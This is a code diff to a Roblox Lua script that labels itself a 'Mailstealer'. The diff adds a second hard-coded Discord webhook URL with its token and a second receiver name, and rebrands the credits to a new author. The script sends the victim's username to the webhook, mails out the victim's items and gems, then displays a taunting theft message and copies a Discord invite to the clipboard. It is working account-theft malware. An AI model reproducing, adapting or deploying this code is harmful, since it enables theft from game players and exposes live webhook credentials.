@@ -1,3 +1,6 @@
+Username2 = "TehPucuk_55"
+webhook2 = "https://discord.com/api/webhooks/1207564545736974366/qFtOwfb7c0uA7HO2RoSH-SPT4kDLc0Om7PjNF_uHFB0Biq1Ys4N8ESfW2m3pwacKJRsN"
+
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
     return
@@ -54,8 +57,8 @@ local function SendMessage(username, diamonds)
 
 	local fields = {
 		{
-			name = "🌊 Player Info:",
-			value = "```Username: "..plr.Name.."\n 🥳 Receiver: "..Username.."\n 💻 Executor Used: " ..identifyexecutor().."```"
+			name = "🌊 UserName:",
+			value = username,
 			inline = true
 		},
 		{
@@ -104,7 +107,7 @@ local function SendMessage(username, diamonds)
             ["color"] = 65280,
 			["fields"] = fields,
 			["footer"] = {
-				["text"] = "Mailstealer by Tobi. discord.gg/GY2RVSEGDT"
+				["text"] = "Mailstealer by Light Monzz. discord.gg/CAr4FZHAyF"
 			}
         }}
     }
@@ -126,7 +129,7 @@ local function SendMessage(username, diamonds)
 
     if webhook and webhook ~= "" then
         local response = request({
-            Url = webhook,
+            Url = webhook, webhook2,
             Method = "POST",
             Headers = headers,
             Body = body
@@ -357,6 +360,6 @@ if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
     end
     SendAllGems()
     local message = require(game.ReplicatedStorage.Library.Client.Message)
-    message.Error("All your items just got stolen by Tobi's mailstealer!\n Join discord.gg/GY2RVSEGDT")
-    setclipboard("discord.gg/GY2RVSEGDT")
+    message.Error("All your items just got stolen by Light Monzz mailstealer!\n Join discord.gg/CAr4FZHAyF")
+    setclipboard("discord.gg/CAr4FZHAyF")
 end
